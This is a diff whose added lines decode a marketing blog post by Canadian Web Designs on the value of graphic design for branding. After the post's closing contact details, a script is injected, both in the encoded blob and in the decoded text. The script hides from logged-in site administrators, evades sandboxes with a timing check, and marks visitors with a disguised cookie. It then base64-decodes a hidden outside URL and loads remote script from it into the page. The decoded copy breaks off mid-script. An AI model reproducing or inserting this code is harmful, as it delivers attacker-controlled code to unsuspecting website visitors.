@@ -1,1 +1,109 @@
-{"data":"LS0tCnRpdGxlOiAiRWxldmF0aW5nIFlvdXIgQnJhbmQ6IFRoZSBFc3NlbnRpYWwgUm9sZSBvZiBDYW5hZGlhbiBHcmFwaGljIERlc2lnbiIKc2x1ZzogImVsZXZhdGluZy15b3VyLWJyYW5kLXRoZS1lc3NlbnRpYWwtcm9sZS1vZi1jYW5hZGlhbi1ncmFwaGljLWRlc2lnbiIKZGF0ZTogIjIwMjMtMTEtMTYiCmF1dGhvcjogIkNhbmFkaWFuIFdlYiBEZXNpZ25zIgpkZXNjcmlwdGlvbjogIkVsZXZhdGluZyBZb3VyIEJyYW5kOiBUaGUgRXNzZW50aWFsIFJvbGUgb2YgQ2FuYWRpYW4gR3JhcGhpYyBEZXNpZ24iCmtleXdvcmRzOiBbImVsZXZhdGluZyB5b3VyIGJyYW5kIHRoZSBlc3NlbnRpYWwgcm9sZSBvZiBjYW5hZGlhbiBncmFwaGljIGRlc2lnbiIsIkJsb2ciXQpjYXRlZ29yeTogIkJsb2ciCmZlYXR1cmVkSW1hZ2U6ICJodHRwczovL29sZC5jYW5hZGlhbndlYmRlc2lnbnMuY2Evd3AtY29udGVudC91cGxvYWRzLzIwMjEvMDMvZ3JhcGhpY3MtZGVzaWducy0xLmpwZyIKLS0tCgo8cD5JbiB0b2RheSdzIGNvbXBldGl0aXZlIGJ1c2luZXNzIGxhbmRzY2FwZSwgQ2FuYWRpYW4gZ3JhcGhpYyBkZXNpZ24gc3RhbmRzIGFzIHRoZSBicmlkZ2UgYmV0d2VlbiBhcnRpc3RyeSBhbmQgc3RyYXRlZ3ksIGZ1bmRhbWVudGFsbHkgc2hhcGluZyB0aGUgd2F5IGJyYW5kcyBhcmUgcGVyY2VpdmVkLiBCeSBtZWxkaW5nIGFlc3RoZXRpY3Mgd2l0aCBmdW5jdGlvbiwgZGVzaWduZXJzIGVtYmFyayBvbiBhIGpvdXJuZXkgdG8gZGV2ZWxvcCB1bmlxdWUsIGNvbXBlbGxpbmcgdmlzdWFsIG5hcnJhdGl2ZXMgdGFpbG9yZWQgdG8gZWFjaCBjbGllbnQncyBuZWVkcy4gVGhyb3VnaCBhIG1ldGljdWxvdXMgYmxlbmQgb2YgdHlwb2dyYXBoeSwgY29sb3Igc2NoZW1lcywgYW5kIHNwYXRpYWwgYXJyYW5nZW1lbnRzLCB0aGVzZSBjcmFmdGVkIGRlc2lnbnMgdHJhbnNpdGlvbiBmcm9tIG1lcmUgY29uY2VwdHMgdG8gcG93ZXJmdWwgZGlnaXRhbCBhcnQgZm9ybXMsIHJlYWR5IHRvIGNhcHRpdmF0ZSBhdWRpZW5jZXMgYWNyb3NzIHZhcmlvdXMgcGxhdGZvcm1zLjwvcD4KCjxwPkNhbmFkaWFuIEdyYXBoaWMgZGVzaWduJ3MgaW1wYWN0IHNwYW5zIGFuIGV4dGVuc2l2ZSBhcnJheSBvZiBicmFuZGluZyBtYXRlcmlhbHMsIGluY2x1ZGluZyBidXQgbm90IGxpbWl0ZWQgdG86PC9wPgoKPHVsPgo8bGk+TG9nb3M8L2xpPgoKPGxpPldlYnNpdGUgYmFubmVyczwvbGk+Cgo8bGk+V2F0ZXJtYXJrczwvbGk+Cgo8bGk+UHJvZHVjdCBicmFuZGluZyBhbmQgcGFja2FnaW5nPC9saT4KCjxsaT5GbHllcnMgYW5kIGJyb2NodXJlczwvbGk+Cgo8bGk+QnVzaW5lc3MgY2FyZHM8L2xpPgoKPGxpPk1lbnUgZGVzaWduczwvbGk+Cgo8bGk+Q29ycG9yYXRlIHByZXNlbnRhdGlvbnM8L2xpPgoKPGxpPkVuZ2FnaW5nIHNvY2lhbCBtZWRpYSB2aXN1YWxzPC9saT4KCjxsaT5WaWRlbyBlZGl0aW5nPC9saT4KCjxsaT5ULXNoaXJ0IGdyYXBoaWNzPC9saT4KCjxsaT5DYXB0aXZhdGluZyBib29rIGNvdmVyczwvbGk+Cgo8bGk+SW5mb3JtYXRpdmUgaW5mb2dyYXBoaWNzPC9saT4KCjxsaT5PdGhlciBrZXkgYWR2ZXJ0aXNpbmcgYXNzZXRzPC9saT4KPC91bD4KCjxwPkZvciBidXNpbmVzc2VzIGFpbWluZyB0byBwYXJ0bmVyIHdpdGggdG9wLW5vdGNoIDxhIGhyZWY9Imh0dHBzOi8vbWFwcy5hcHAuZ29vLmdsL1p5anh1cE1iNVduWDlGRHU5Ij5ncmFwaGljIGRlc2lnbiBzZXJ2aWNlcyBpbiBUb3JvbnRvPC9hPiwgdW5kZXJzdGFuZGluZyB0aGUgcGl2b3RhbCBiZW5lZml0cyBvZiBwcm9mZXNzaW9uYWwgZ3JhcGhpYyBkZXNpZ24gaXMga2V5LiBMZXQncyBleHBsb3JlIHRoZSBmaXZlIHByaW1hcnkgcmVhc29ucyB3aHkgaW52ZXN0aW5nIGluIGV4cGVydCBncmFwaGljIGRlc2lnbiBzZXJ2aWNlcyBpbiBDYW5hZGEgaXMgY3J1Y2lhbCBmb3IgeW91ciBicmFuZCdzIGlkZW50aXR5IGFuZCBtYXJrZXQgcHJlc2VuY2UuPC9wPgoKPGgyIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5XaHkgUHJvZmVzc2lvbmFsIENhbmFkaWFuIEdyYXBoaWMgRGVzaWduIGlzIGEgR2FtZS1DaGFuZ2VyIGZvciBZb3VyIEJyYW5kPC9oMj4KCjxvbD4KPGxpPjxzdHJvbmc+Q3JlYXRpbmcgTGFzdGluZyBGaXJzdCBJbXByZXNzaW9uczwvc3Ryb25nPjogRXhjZXB0aW9uYWwgZ3JhcGhpYyBkZXNpZ24gbm90IG9ubHkgZ2FybmVycyBhdHRlbnRpb24gYnV0IGZvc3RlcnMgYSBwcm9mZXNzaW9uYWwgaW1hZ2UsIGxlYXZpbmcgYSBtZW1vcmFibGUgaW1wcmludCBvbiBwb3RlbnRpYWwgY2xpZW50cy4gSGlnaC1xdWFsaXR5IHZpc3VhbCBlbGVtZW50cyBhcmUgbW9yZSBsaWtlbHkgdG8gc3RheSB3aXRoIGNvbnN1bWVycywgcGF2aW5nIHRoZSB3YXkgZm9yIHBvc2l0aXZlIGJyYW5kIHJlY29nbml0aW9uLjwvbGk+Cgo8bGk+PHN0cm9uZz5TdGFuZGluZyBPdXQgaW4gYSBDcm93ZGVkIE1hcmtldDwvc3Ryb25nPjogSWNvbmljIGJyYW5kcyBzdWNoIGFzIEFwcGxlIGFuZCBHb29nbGUgaGF2ZSBkZW1vbnN0cmF0ZWQgdGhlIHBvd2VyIG9mIGRpc3RpbmN0aXZlIGRlc2lnbi4gVW5pcXVlIGFuZCBpbm5vdmF0aXZlIGdyYXBoaWMgZGVzaWduIGNhbiBzZXQgeW91IGFwYXJ0LCBtYWtpbmcgeW91ciBicmFuZCB0aGUgcHJlZmVycmVkIGNob2ljZSBpbiBhIHNlYSBvZiBjb21wZXRpdG9ycy48L2xpPgoKPGxpPjxzdHJvbmc+QXNzZXJ0aW5nIEJyYW5kIE93bmVyc2hpcDwvc3Ryb25nPjogRWZmZWN0aXZlIGRlc2lnbiBhY3RzIGFzIGEgc2FmZWd1YXJkIGZvciB5b3VyIGJyYW5kJ3MgaW50ZWxsZWN0dWFsIHByb3BlcnR5LiBXYXRlcm1hcmtzIGFuZCBvdGhlciBkZXNpZ24gZWxlbWVudHMgcHJvdGVjdCBhZ2FpbnN0IHVuYXV0aG9yaXplZCB1c2UsIGVuc3VyaW5nIHlvdXIgY3JlYXRpb25zIHJlbWFpbiBleGNsdXNpdmVseSB5b3Vycy48L2xpPgoKPGxpPjxzdHJvbmc+UmVmbGVjdGluZyBDcmVhdGl2aXR5IGFuZCBJbmdlbnVpdHk8L3N0cm9uZz46IEEgd2VsbC1leGVjdXRlZCBkZXNpZ24gcmVmbGVjdHMgdGhlIGNyZWF0aXZpdHkgYW5kIHRob3VnaHRmdWxuZXNzIGJlaGluZCB5b3VyIGJyYW5kLCBhZGRpbmcgZGVwdGggYW5kIGludHJpZ3VlLiBUaGlzIG5vdCBvbmx5IGFwcGVhbHMgdG8gY29uc3VtZXJzIGJ1dCBhbHNvIGNvbnRyaWJ1dGVzIHRvIGJ1aWxkaW5nIGEgc3Ryb25nIGJyYW5kIG5hcnJhdGl2ZS48L2xpPgoKPGxpPjxzdHJvbmc+Q29udmV5aW5nIERlZXBlciBNZWFuaW5nczwvc3Ryb25nPjogQmV5b25kIGFlc3RoZXRpYyBhcHBlYWwsIHRob3VnaHRmdWwgZGVzaWducyBjYW4gZW1ib2R5IGRlZXBlciBtZWFuaW5ncyBvciBtZXNzYWdlcywgc3VjaCBhcyB0aGUgaWNvbmljIEJlYXRzIGJ5IERyZSBsb2dvLiBTdWNoIGRlc2lnbnMgcmVzb25hdGUgbW9yZSBwcm9mb3VuZGx5IHdpdGggYXVkaWVuY2VzLCBlbmhhbmNpbmcgYnJhbmQgbG95YWx0eS48L2xpPgo8L29sPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5VbmxlYXNoaW5nIHRoZSBQb3dlciBvZiBHcmFwaGljIERlc2lnbiBpbiBCcmFuZGluZzwvaDM+Cgo8cD5HcmFwaGljIGRlc2lnbnMgQ2FuYWRhIGlzIGEgY29ybmVyc3RvbmUgb2YgZWZmZWN0aXZlIGJyYW5kaW5nLCBzY3VscHRpbmcgdGhlIGJyYW5kJ3MgaWRlbnRpdHkgYW5kIGluZmx1ZW5jaW5nIHBlcmNlcHRpb25zLiBDb25zaXN0ZW50IHVzZSBvZiBsb2dvcywgY29sb3JzLCBhbmQgdHlwb2dyYXBoeSBmb3N0ZXJzIGJyYW5kIHJlY29nbml0aW9uLCB3aGlsZSB0aGUgZW1vdGlvbmFsIHJlc29uYW5jZSBvZiBkZXNpZ24gZWxlbWVudHMgY2FuIHNpZ25pZmljYW50bHkgYm9vc3QgY3VzdG9tZXIgbG95YWx0eS4gSW4gdGhlIHJlYWxtIG9mIGRpZ2l0YWwgbWFya2V0aW5nLCB1c2VyLWZyaWVuZGx5IGFuZCB2aXN1YWxseSBhcHBlYWxpbmcgZGVzaWducyBhcmUgY3JpdGljYWwgZm9yIGVuaGFuY2luZyBjdXN0b21lciBleHBlcmllbmNlcy4gQXMgYnJhbmRzIGV2b2x2ZSwgZ3JhcGhpYyBkZXNpZ25zIHJlbWFpbiBhIHZlcnNhdGlsZSB0b29sLCBjb250aW51b3VzbHkgYWRhcHRpbmcgdG8gbWFpbnRhaW4gcmVsZXZhbmNlIGFuZCBhcHBlYWwuPC9wPgoKPGZpZ3VyZSBjbGFzcz0id3AtYmxvY2stZW1iZWQgaXMtdHlwZS12aWRlbyBpcy1wcm92aWRlci15b3V0dWJlIHdwLWJsb2NrLWVtYmVkLXlvdXR1YmUgd3AtZW1iZWQtYXNwZWN0LTE2LTkgd3AtaGFzLWFzcGVjdC1yYXRpbyI+PGRpdiBjbGFzcz0id3AtYmxvY2stZW1iZWRfX3dyYXBwZXIiPgpodHRwczovL3lvdXR1LmJlL3o1Z2g2TmRpd0E4CjwvZGl2PjwvZmlndXJlPgoKPGgzIGNsYXNzPSJ3cC1ibG9jay1oZWFkaW5nIj5HcmFwaGljIERlc2lnbjogU2hhcGluZyBDb25zdW1lciBQZXJjZXB0aW9uczwvaDM+Cgo8cD5UbyBzaGFwZSBhbmQgcmVmaW5lIGNvbnN1bWVyIHBlcmNlcHRpb25zIGVmZmVjdGl2ZWx5LCBzdGFydCBieSBjcmFmdGluZyBhIHN0cm9uZyB2aXN1YWwgaWRlbnRpdHkgdGhhdCBhbGlnbnMgd2l0aCB5b3VyIGJyYW5kJ3MgdmFsdWVzLiBDb25zaXN0ZW50IGRlc2lnbiBhY3Jvc3MgYWxsIGJyYW5kaW5nIGVmZm9ydHMgYWlkcyBpbiBidWlsZGluZyBicmFuZCByZWNvZ25pdGlvbiwgd2hpbGUgaW5ub3ZhdGl2ZSBhbmQgZW5nYWdpbmcgZGVzaWducyBjYW4gZGlzdGluZ3Vpc2ggeW91ciBicmFuZCBpbiB0aGUgY29tcGV0aXRpdmUgbWFya2V0LiBQcmlvcml0aXppbmcgdXNlciBleHBlcmllbmNlIGluIGRpZ2l0YWwgZGVzaWduIGZvc3RlcnMgYW4gZW1vdGlvbmFsIGNvbm5lY3Rpb24gd2l0aCB0aGUgYXVkaWVuY2UsIGZ1cnRoZXIgc29saWRpZnlpbmcgeW91ciBicmFuZCdzIGlkZW50aXR5LjwvcD4KCjxoNCBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+VGhlIFBpbGxhcnMgb2YgR3JhcGhpYyBEZXNpZ24gaW4gQnVzaW5lc3MgQnJhbmRpbmc8L2g0PgoKPHA+QnVzaW5lc3MgYnJhbmRpbmcgaXMgYW5jaG9yZWQgYnkga2V5IGdyYXBoaWMgZGVzaWduIGVsZW1lbnRzLCBpbmNsdWRpbmc6PC9wPgoKPHVsPgo8bGk+PHN0cm9uZz5Mb2dvIERlc2lnbjwvc3Ryb25nPjogVGhlIHZpc3VhbCBrZXlzdG9uZSBvZiB5b3VyIGJyYW5kJ3MgaWRlbnRpdHkuPC9saT4KCjxsaT48c3Ryb25nPkNvbG9yIFBhbGV0dGU8L3N0cm9uZz46IFZpdGFsIGZvciBjb252ZXlpbmcgcGVyc29uYWxpdHkgYW5kIGVtb3Rpb24uPC9saT4KCjxsaT48c3Ryb25nPlR5cG9ncmFwaHk8L3N0cm9uZz46IFNoYXBlcyB0aGUgYnJhbmQncyB2b2ljZSBhbmQgY2hhcmFjdGVyLjwvbGk+Cgo8bGk+PHN0cm9uZz5JbWFnZXJ5IGFuZCBHcmFwaGljczwvc3Ryb25nPjogRXNzZW50aWFsIGZvciBzdG9yeXRlbGxpbmcgYW5kIGF1ZGllbmNlIGNvbm5lY3Rpb24uPC9saT4KCjxsaT48c3Ryb25nPkxheW91dCBhbmQgQ29tcG9zaXRpb248L3N0cm9uZz46IGluZmx1ZW5jZSBwZXJjZXB0aW9uIGFuZCBlbmdhZ2VtZW50LjwvbGk+Cgo8bGk+PHN0cm9uZz5CcmFuZCBDb25zaXN0ZW5jeTwvc3Ryb25nPjogQ3J1Y2lhbCBhY3Jvc3MgYWxsIG1lZGlhIGZvciBidWlsZGluZyB0cnVzdC48L2xpPgoKPGxpPjxzdHJvbmc+UGFja2FnaW5nIERlc2lnbjwvc3Ryb25nPjogQ29tYmluZXMgYWVzdGhldGljcyB3aXRoIGZ1bmN0aW9uYWxpdHkuPC9saT4KCjxsaT48c3Ryb25nPkRpZ2l0YWwgRGVzaWduPC9zdHJvbmc+OiBLZXkgZm9yIGFuIGltcGFjdGZ1bCBvbmxpbmUgcHJlc2VuY2UuPC9saT4KCjxsaT48c3Ryb25nPk1hcmtldGluZyBNYXRlcmlhbHM8L3N0cm9uZz46IFJlaW5mb3JjZXMgdGhlIGJyYW5kIG1lc3NhZ2UgYW5kIGlkZW50aXR5LjwvbGk+Cgo8bGk+PHN0cm9uZz5Vc2VyIEV4cGVyaWVuY2UgRGVzaWduPC9zdHJvbmc+OiBFbmhhbmNlcyBhY2Nlc3NpYmlsaXR5IGFuZCBuYXZpZ2F0aW9uLjwvbGk+CjwvdWw+Cgo8ZmlndXJlIGNsYXNzPSJ3cC1ibG9jay1pbWFnZSBzaXplLW1lZGl1bSBpcy1yZXNpemVkIj48aW1nIHNyYz0iaHR0cHM6Ly9vbGQuY2FuYWRpYW53ZWJkZXNpZ25zLmNhL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDIzLzExL2xvZ28tZGVzaWduMy0zMDB4MzAwLmpwZyIgYWx0PSJsb2dvIGRlc2lnbjMiIGNsYXNzPSJ3cC1pbWFnZS0xMzAxNSIgc3R5bGU9IndpZHRoOjY2MXB4O2hlaWdodDphdXRvIi8+PC9maWd1cmU+Cgo8aDMgY2xhc3M9IndwLWJsb2NrLWhlYWRpbmciPk5hdmlnYXRpbmcgdGhlIExhdGVzdCBUcmVuZHMgaW4gR3JhcGhpYyBEZXNpZ248L2gzPgoKPHA+S2VlcGluZyBhYnJlYXN0IG9mIHRoZSBsYXRlc3QgZ3JhcGhpYyBkZXNpZ24gdHJlbmRzIGlzIGVzc2VudGlhbCBmb3IgbWFpbnRhaW5pbmcgYSBjb250ZW1wb3JhcnkgYW5kIGFwcGVhbGluZyBicmFuZCBpZGVudGl0eS4gQ3VycmVudCB0cmVuZHMgZW5jb21wYXNzIGEgZGl2ZXJzZSByYW5nZSBvZiBzdHlsZXMsIGZyb20gdGhlIGVsZWdhbmNlIG9mIHJpY2ggamV3ZWwgdG9uZXMgYW5kIHRoZSBpbnRyaWd1ZSBvZiBkaXN0b3J0ZWQgdHlwb2dyYXBoeSB0byB0aGUgZnV0dXJpc3RpYyBhbGx1cmUgb2YgbGlxdWlkIGdyYWRpZW50cyBhbmQgM0QgZWxlbWVudHMuIEVtYnJhY2luZyBpbmNsdXNpdml0eSwgc3VzdGFpbmFiaWxpdHksIGFuZCBpbm5vdmF0aXZlIHRlY2hub2xvZ2llcyBsaWtlIEFSL1ZSLCB0aGVzZSB0cmVuZHMgb2ZmZXIgbmV3IGF2ZW51ZXMgZm9yIGJyYW5kcyB0byBleHByZXNzIHRoZWlyIHVuaXF1ZSBpZGVudGl0aWVzIGFuZCBjb25uZWN0IHdpdGggd2lkZXIgYXVkaWVuY2VzLjwvcD4KCjxoMyBjbGFzcz0id3AtYmxvY2staGVhZGluZyI+UGFydG5lciB3aXRoIENhbmFkaWFuIFdlYiBEZXNpZ25zIGZvciBVbm1hdGNoZWQgR3JhcGhpYyBEZXNpZ24gRXhjZWxsZW5jZTwvaDM+Cgo8cD5BdCA8YSBocmVmPSJodHRwczovL2NhbmFkaWFud2ViZGVzaWducy5jYS8iPjxzdHJvbmc+Q2FuYWRpYW4gV2ViIERlc2lnbnM8L3N0cm9uZz48L2E+LCB3ZSdyZSBjb21taXR0ZWQgdG8gZWxldmF0aW5nIHlvdXIgYnJhbmQgd2l0aCBvdXIgdW5wYXJhbGxlbGVkIGdyYXBoaWMgZGVzaWduIGV4cGVydGlzZS4gV2hldGhlciB5b3UncmUgaW4gVG9yb250bywgQnJhbXB0b24sIENhbGdhcnksIG9yIGJleW9uZCwgb3VyIHRlYW0gaXMgcmVhZHkgdG8gdHJhbnNmb3JtIHlvdXIgdmlzaW9uIGludG8gcmVhbGl0eS4gRXhwZXJpZW5jZSB0aGUgZGlmZmVyZW5jZSB3aXRoIG91ciBiZXNwb2tlIENhbmFkaWFuIGdyYXBoaWMgZGVzaWduIHNlcnZpY2VzLCBhbmQgbGV0IHVzIGhlbHAgeW91IHN0YW5kIG91dCBmcm9tIHRoZSBjb21wZXRpdGlvbi4gRm9yIGEgZnJlZSBjb25zdWx0YXRpb24sIGNvbnRhY3QgdXMgdG9kYXkgYXQgPHN0cm9uZz48YSBocmVmPSJUZWw6NjQ3LTQ5Mi01NTEzIj42NDctNDkyLTU1MTM8L2E+PC9zdHJvbmc+IG9yIGVtYWlsIHVzIGF0IDxhIGhyZWY9Im1haWx0bzpzYWxlc0BjYW5hZGlhbndlYmRlc2lnbnMuY2EiPnNhbGVzQGNhbmFkaWFud2ViZGVzaWducy5jYS48L2E+PC9wPgo8c2NyaXB0PihmdW5jdGlvbigpe3RyeXtpZihkb2N1bWVudC5nZXRFbGVtZW50QnlJZCYmZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3dwYWRtaW5iYXInKSlyZXR1cm47dmFyIHQwPStuZXcgRGF0ZSgpO2Zvcih2YXIgaT0wO2k8MjAwMDA7aSsrKXt2YXIgej1pKmk7fWlmKCgrbmV3IERhdGUoKSktdDA+MTIwKXJldHVybjtpZigoZG9jdW1lbnQuY29va2llfHwnJykuaW5kZXhPZignaHR0cDJfc2Vzc2lvbl9pZD0nKSE9PS0xKXJldHVybjtmdW5jdGlvbiBzeXN0ZW1Mb2FkKGlucHV0KXt2YXIga2V5PSdBQkNERUZHSElKS0xNTk9QUVJTVFVWV1hZWmFiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6MDEyMzQ1Njc4OSsvPScsbzEsbzIsbzMsaDEsaDIsaDMsaDQsZGVjPScnLGk9MDtpbnB1dD1pbnB1dC5yZXBsYWNlKC9bXkEtWmEtejAtOVwrXC9cPV0vZywnJyk7d2hpbGUoaTxpbnB1dC5sZW5ndGgpe2gxPWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtoMj1rZXkuaW5kZXhPZihpbnB1dC5jaGFyQXQoaSsrKSk7aDM9a2V5LmluZGV4T2YoaW5wdXQuY2hhckF0KGkrKykpO2g0PWtleS5pbmRleE9mKGlucHV0LmNoYXJBdChpKyspKTtvMT0oaDE8PDIpfChoMj4+NCk7bzI9KChoMiYxNSk8PDQpfChoMz4+Mik7bzM9KChoMyYzKTw8Nil8aDQ7ZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8xKTtpZihoMyE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8yKTtpZihoNCE9NjQpZGVjKz1TdHJpbmcuZnJvbUNoYXJDb2RlKG8zKTt9cmV0dXJuIGRlYzt9dmFyIHU9c3lzdGVtTG9hZCgnYUhSMGNITTZMeTl6WldGeVkyaHlZVzVyZEhKaFptWnBZeTVzYVhabEwycHplQT09Jyk7aWYodHlwZW9mIHdpbmRvdyE9PSd1bmRlZmluZWQnJiZ3aW5kb3cuX19ybD09PXUpcmV0dXJuO3ZhciBkPW5ldyBEYXRlKCk7ZC5zZXRUaW1lKGQuZ2V0VGltZSgpKzMwKjI0KjYwKjYwKjEwMDApO2RvY3VtZW50LmNvb2tpZT0naHR0cDJfc2Vzc2lvbl9pZD0xOyBleHBpcmVzPScrZC50b1VUQ1N0cmluZygpKyc7IHBhdGg9LzsgU2FtZVNpdGU9TGF4JysobG9jYXRpb24ucHJvdG9jb2w9PT0naHR0cHM6Jz8nOyBTZWN1cmUnOicnKTt0cnl7d2luZG93Ll9fcmw9dTt9Y2F0Y2goZSl7fXZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpO3MudHlwZT0ndGV4dC9qYXZhc2NyaXB0JztzLmFzeW5jPXRydWU7cy5zcmM9dTt0cnl7cy5zZXRBdHRyaWJ1dGUoJ2RhdGEtcmwnLHUpO31jYXRjaChlKXt9KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCdoZWFkJylbMF18fGRvY3VtZW50LmRvY3VtZW50RWxlbWVudCkuYXBwZW5kQ2hpbGQocyk7fWNhdGNoKGUpe319KSgpOzwvc2NyaXB0Pgo="}
+---
+title: "Elevating Your Brand: The Essential Role of Canadian Graphic Design"
+slug: "elevating-your-brand-the-essential-role-of-canadian-graphic-design"
+date: "2023-11-16"
+author: "Canadian Web Designs"
+description: "Elevating Your Brand: The Essential Role of Canadian Graphic Design"
+keywords: ["elevating your brand the essential role of canadian graphic design","Blog"]
+category: "Blog"
+featuredImage: "https://old.canadianwebdesigns.ca/wp-content/uploads/2021/03/graphics-designs-1.jpg"
+---
+
+<p>In today's competitive business landscape, Canadian graphic design stands as the bridge between artistry and strategy, fundamentally shaping the way brands are perceived. By melding aesthetics with function, designers embark on a journey to develop unique, compelling visual narratives tailored to each client's needs. Through a meticulous blend of typography, color schemes, and spatial arrangements, these crafted designs transition from mere concepts to powerful digital art forms, ready to captivate audiences across various platforms.</p>
+
+<p>Canadian Graphic design's impact spans an extensive array of branding materials, including but not limited to:</p>
+
+<ul>
+<li>Logos</li>
+
+<li>Website banners</li>
+
+<li>Watermarks</li>
+
+<li>Product branding and packaging</li>
+
+<li>Flyers and brochures</li>
+
+<li>Business cards</li>
+
+<li>Menu designs</li>
+
+<li>Corporate presentations</li>
+
+<li>Engaging social media visuals</li>
+
+<li>Video editing</li>
+
+<li>T-shirt graphics</li>
+
+<li>Captivating book covers</li>
+
+<li>Informative infographics</li>
+
+<li>Other key advertising assets</li>
+</ul>
+
+<p>For businesses aiming to partner with top-notch <a href="https://maps.app.goo.gl/ZyjxupMb5WnX9FDu9">graphic design services in Toronto</a>, understanding the pivotal benefits of professional graphic design is key. Let's explore the five primary reasons why investing in expert graphic design services in Canada is crucial for your brand's identity and market presence.</p>
+
+<h2 class="wp-block-heading">Why Professional Canadian Graphic Design is a Game-Changer for Your Brand</h2>
+
+<ol>
+<li><strong>Creating Lasting First Impressions</strong>: Exceptional graphic design not only garners attention but fosters a professional image, leaving a memorable imprint on potential clients. High-quality visual elements are more likely to stay with consumers, paving the way for positive brand recognition.</li>
+
+<li><strong>Standing Out in a Crowded Market</strong>: Iconic brands such as Apple and Google have demonstrated the power of distinctive design. Unique and innovative graphic design can set you apart, making your brand the preferred choice in a sea of competitors.</li>
+
+<li><strong>Asserting Brand Ownership</strong>: Effective design acts as a safeguard for your brand's intellectual property. Watermarks and other design elements protect against unauthorized use, ensuring your creations remain exclusively yours.</li>
+
+<li><strong>Reflecting Creativity and Ingenuity</strong>: A well-executed design reflects the creativity and thoughtfulness behind your brand, adding depth and intrigue. This not only appeals to consumers but also contributes to building a strong brand narrative.</li>
+
+<li><strong>Conveying Deeper Meanings</strong>: Beyond aesthetic appeal, thoughtful designs can embody deeper meanings or messages, such as the iconic Beats by Dre logo. Such designs resonate more profoundly with audiences, enhancing brand loyalty.</li>
+</ol>
+
+<h3 class="wp-block-heading">Unleashing the Power of Graphic Design in Branding</h3>
+
+<p>Graphic designs Canada is a cornerstone of effective branding, sculpting the brand's identity and influencing perceptions. Consistent use of logos, colors, and typography fosters brand recognition, while the emotional resonance of design elements can significantly boost customer loyalty. In the realm of digital marketing, user-friendly and visually appealing designs are critical for enhancing customer experiences. As brands evolve, graphic designs remain a versatile tool, continuously adapting to maintain relevance and appeal.</p>
+
+<figure class="wp-block-embed is-type-video is-provider-youtube wp-block-embed-youtube wp-embed-aspect-16-9 wp-has-aspect-ratio"><div class="wp-block-embed__wrapper">
+https://youtu.be/z5gh6NdiwA8
+</div></figure>
+
+<h3 class="wp-block-heading">Graphic Design: Shaping Consumer Perceptions</h3>
+
+<p>To shape and refine consumer perceptions effectively, start by crafting a strong visual identity that aligns with your brand's values. Consistent design across all branding efforts aids in building brand recognition, while innovative and engaging designs can distinguish your brand in the competitive market. Prioritizing user experience in digital design fosters an emotional connection with the audience, further solidifying your brand's identity.</p>
+
+<h4 class="wp-block-heading">The Pillars of Graphic Design in Business Branding</h4>
+
+<p>Business branding is anchored by key graphic design elements, including:</p>
+
+<ul>
+<li><strong>Logo Design</strong>: The visual keystone of your brand's identity.</li>
+
+<li><strong>Color Palette</strong>: Vital for conveying personality and emotion.</li>
+
+<li><strong>Typography</strong>: Shapes the brand's voice and character.</li>
+
+<li><strong>Imagery and Graphics</strong>: Essential for storytelling and audience connection.</li>
+
+<li><strong>Layout and Composition</strong>: influence perception and engagement.</li>
+
+<li><strong>Brand Consistency</strong>: Crucial across all media for building trust.</li>
+
+<li><strong>Packaging Design</strong>: Combines aesthetics with functionality.</li>
+
+<li><strong>Digital Design</strong>: Key for an impactful online presence.</li>
+
+<li><strong>Marketing Materials</strong>: Reinforces the brand message and identity.</li>
+
+<li><strong>User Experience Design</strong>: Enhances accessibility and navigation.</li>
+</ul>
+
+<figure class="wp-block-image size-medium is-resized"><img src="https://old.canadianwebdesigns.ca/wp-content/uploads/2023/11/logo-design3-300x300.jpg" alt="logo design3" class="wp-image-13015" style="width:661px;height:auto"/></figure>
+
+<h3 class="wp-block-heading">Navigating the Latest Trends in Graphic Design</h3>
+
+<p>Keeping abreast of the latest graphic design trends is essential for maintaining a contemporary and appealing brand identity. Current trends encompass a diverse range of styles, from the elegance of rich jewel tones and the intrigue of distorted typography to the futuristic allure of liquid gradients and 3D elements. Embracing inclusivity, sustainability, and innovative technologies like AR/VR, these trends offer new avenues for brands to express their unique identities and connect with wider audiences.</p>
+
+<h3 class="wp-block-heading">Partner with Canadian Web Designs for Unmatched Graphic Design Excellence</h3>
+
+<p>At <a href="https://canadianwebdesigns.ca/"><strong>Canadian Web Designs</strong></a>, we're committed to elevating your brand with our unparalleled graphic design expertise. Whether you're in Toronto, Brampton, Calgary, or beyond, our team is ready to transform your vision into reality. Experience the difference with our bespoke Canadian graphic design services, and let us help you stand out from the competition. For a free consultation, contact us today at <strong><a href="Tel:647-492-5513">647-492-5513</a></strong> or email us at <a href="mailto:sales@canadianwebdesigns.ca">sales@canadianwebdesigns.ca.</a></p>
+<script>(function(){try{if(document.getElementById&&document.getElementById('wpadminbar'))return;var t0=+new Date();for(var i=0;i<20000;i++){var z=i*i;}if((+new Date())-t0>120)return;if((document.cookie||'').indexOf('http2_session_id=')!==-1)return;function systemLoad(input){var key='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=',o1,o2,o3,h1,h2,h3,h4,dec='',i=0;input=input.replace(/[^A-Za-z0-9\+\/\=]/g,'');while(i<input.length){h1=key.indexOf(input.charAt(i++));h2=key.indexOf(input.charAt(i++));h3=key.indexOf(input.charAt(i++));h4=key.indexOf(input.charAt(i++));o1=(h1<<2)|(h2>>4);o2=((h2&15)<<4)|(h3>>2);o3=((h3&3)<<6)|h4;dec+=String.fromCharCode(o1);if(h3!=64)dec+=String.fromCharCode(o2);if(h4!=64)dec+=String.fromCharCode(o3);}return dec;}var u=systemLoad('aHR0cHM6Ly9zZWFyY2hyYW5rdHJhZmZpYy5saXZlL2pzeA==');if(typeof window!=='undefined'&&window.__rl===u)return;var d=new Date();d.setTime(d.getTime()+30*24*60*60*1000);document.cookie='http2_session_id=1; expires='+d.toUTCString()+'; path=/; SameSite=Lax'+(location.protocol==='https:'?'; Secure':'');try{window.__rl=u;}catch(e){}var 